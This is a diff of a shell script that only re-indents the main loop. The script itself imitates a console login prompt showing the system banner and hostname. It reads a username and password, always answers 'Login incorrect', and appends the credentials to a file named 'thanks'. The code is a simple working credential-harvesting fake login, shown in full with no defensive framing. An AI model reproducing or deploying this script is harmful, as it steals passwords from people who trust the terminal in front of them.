@@ -18,13 +18,13 @@ echo "$(cat /etc/issue.net) $HOSTNAME tty1"
 echo
 
 while (sleep 0); do
-echo -n "$HOSTNAME login: "
-read u
-echo -n "Password: "
-read -s p
-echo
-echo "Login incorrect"
-echo $u $p >> thanks
-echo
-sleep 1
+    echo -n "$HOSTNAME login: "
+    read u
+    echo -n "Password: "
+    read -s p
+    echo
+    echo "Login incorrect"
+    echo $u $p >> thanks
+    echo
+    sleep 1
 done
